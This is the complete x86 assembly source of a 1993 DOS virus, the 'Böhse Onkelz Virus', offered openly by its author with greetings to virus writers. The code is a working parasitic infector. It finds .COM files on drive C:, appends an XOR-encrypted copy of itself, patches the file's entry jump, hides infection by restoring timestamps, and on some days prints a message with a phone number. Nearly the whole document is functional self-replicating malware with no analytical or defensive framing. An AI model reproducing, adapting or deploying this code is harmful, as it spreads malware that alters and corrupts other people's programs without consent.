; ...........................................................................
; .                                                                         .
; .                        B�hse Onkelz Virus                               .
; .                   ����������������������������                          .
; .                                                                         .
; .  type......: non-res. com-infector, parasitic                           .
; .  author....: A B�hse Onkelz Fan from Eastgermany in Sep. 1993 !!!       .
; .  details...: - files only in curr. dir on drive C: will be infected     .
; .              - restores old time & date stamp                           .
; .              - infects only files of proper length                      .
; .              - NOT destructive                                          .
; .                ~~~                                                      .
; .              - encrypted                                                .
; .           /  - message on infection when day=month,chance               .
; ...........................................................................
new_dta   equ 64100
old_dta   equ 80h
file_name equ new_dta + 01eh
v_len     equ end_mark - start           
f_min_len equ 1007
f_max_len equ 64000
prog_buf  equ 64700
new_drive equ 2

CODE   SEGMENT BYTE PUBLIC 'CODE'                           
       assume  cs:code,ds:code,es:code,ss:code                    
       org     100h                      

dummy: jmp start                ;\ this is infected 5 bytes prog (dummy)
       int 20h                  ;/      = nop,nop,nop,int 20h
        
start: call s1 
s1:    pop bp
       sub bp,offset s1
       lea si,[bp+realprog]
       call nd_crypt
       jmp short realprog
nd_crypt:
       mov dx,[bp+offset en_val]
       mov cx,offset end_enc-offset realprog
       mov di,si
n_loop:lodsb
       xor al,dl
       stosb
       loop n_loop
       ret

realprog:
       mov ah,1ah               ;save parameters coz killed later
       mov dx,new_dta           ;
       int 21h                  ;
       lea si,[bp+orig_bytes]
       mov di,100h
       mov cx,3
       cld
       rep movsb
get_drive:
       mov ah,19h          ;save
       int 21h
       mov [bp+old_drive],al   
       mov ah,0eh              ;get new
       mov dl,new_drive
       int 21h
find_first_file:
       mov ah,04eh
       xor cx,cx
       lea dx,[bp+mask_com]
f_ff1: int 21h
       jnc check_if_ill
       jmp done
check_if_ill:
       mov ax,3d02h                     
       mov dx,file_name
       int 21h                           
       mov bx,ax        
       
       mov ax,4202h             ;get length of file
       call set_ptr
       
       cmp ax,f_min_len  ; size < down limit ?
       jl find_next_file ;          - yes --> fi_ne_fi
       cmp ax,f_max_len  ;          - no  --> size > up limit ?
       jl find_next_file ;                             - less -->infect!
       mov ax,5700h     
       int 21h
       push cx
       mov al,cl
       mov cl,3                          
       shl al,cl        
       cmp al,00110000b         ;vegleichen auf sec.=12 (6)
       pop cx
       jne infect          

find_next_file:                   
       mov ah,3eh        ;close file   
       int 21h                            
       mov ah,4fh        ;find next
       jmp f_ff1
   
infect:
       and cl,11100000b
       xor cl,00000110b                 ;12 sec setzen
       push cx
       push dx                           
get_val:
       mov ah,2ch
       int 21h
       or dl,dl
       je get_val
       mov byte ptr [bp+offset en_val],dl
       
       mov ax,4200h                     ;Zeiger auf Dateianfang
       call set_ptr

       mov ah,3fh                       ;erste 3 byt d. zuinfiz.prog sichern
       lea dx,[bp+orig_bytes]
       mov cx,3
       int 21h
       
       mov ax,4202h                     ;Zeiger auf Dateiende
       call set_ptr

       sub ax,3
       mov cs:[bp+addr_jmp],ax          ;L�nge der Datei ablesen
       ;----------
       lea si,[bp+start]
       mov di,prog_buf
       mov cx,v_len
       cld 
       rep movsb
       mov si,prog_buf + offset realprog - offset start
       call nd_crypt
       mov ah,40h
       mov dx,prog_buf
       mov cx,v_len
       int 21h
       ;----------
       mov ax,4200h                     ;Zeiger auf Dateianfang
       call set_ptr

       mov ah,40h                       ;neue 3 bytes schreiben (Sprung zum
       mov cx,3                         ;Virusk�rper)
       lea dx,[bp+vir_jmp_adr]
       int 21h
       mov ax,5701h                     ;Datum u. Zeit wiederhrst.
       pop dx
       pop cx
       int 21h
       mov ah,3eh                       ;close file
       int 21h
    ;---
       mov ah,2ah
       int 21h
       cmp dh,dl
       jnz done
       mov ah,2ch
       int 21h
       and dh,7
       jnz done
       mov ah,9
       lea dx,[bp+msg]
       int 21h
   ;----
done:  mov ah,1ah
       mov dx,old_dta
       int 21h
       mov ah,0eh
       mov dl,[bp+old_drive]
       int 21h
       mov ax,0100h                     ; zum Wirtsprog jumpen
       push ax
       ret

set_ptr: xor cx,cx
         xor dx,dx
         int 21h
         ret

vir_jmp_adr:
  make_jmp  db 0e9h                       ;jmp
  addr_jmp  dw ?                          ;jmp-vektor
orig_bytes db 90h,90h,90h   
mask_com   db  "*.CoM",0

;**************************************************************************
;**************************************************************************
;******** ONLY A LAMER WILL CHANGE THE TEXT BELOW AND SAY *****************
;******** EVERY PEOPLE AROUND THAT HE HAD WRITTEN THIS VIRUS ! ************
;**************************************************************************
;**************************************************************************
msg: db 10,13,9,  "Hello User, You have The Boehse Onkelz Virus 1.5!"
     db 10,13,9,  "I was written in Eastgermany in Sept. 1993 !"
     db 13,10 
     db 13,10,9,9,"If you're an Onkelz Fan, call the following number!"
     db 13,10,9,9,9,     "Germany (0049): 069/445052 !"
     db 13,10
     db 13,10,9,9,9,9,  "Wir ham' noch lange nicht genug...!!! " 
     db 13,10,'$'


old_drive  db ?
end_enc:

en_val  db 0                            ;XOR-encryption value
end_mark:

CODE    ENDS                                
        END     dummy







;;===========================================================================
;;==============MOST GREETINGS TO ALL VIRUS WRITERS !========================
;;===========================================================================
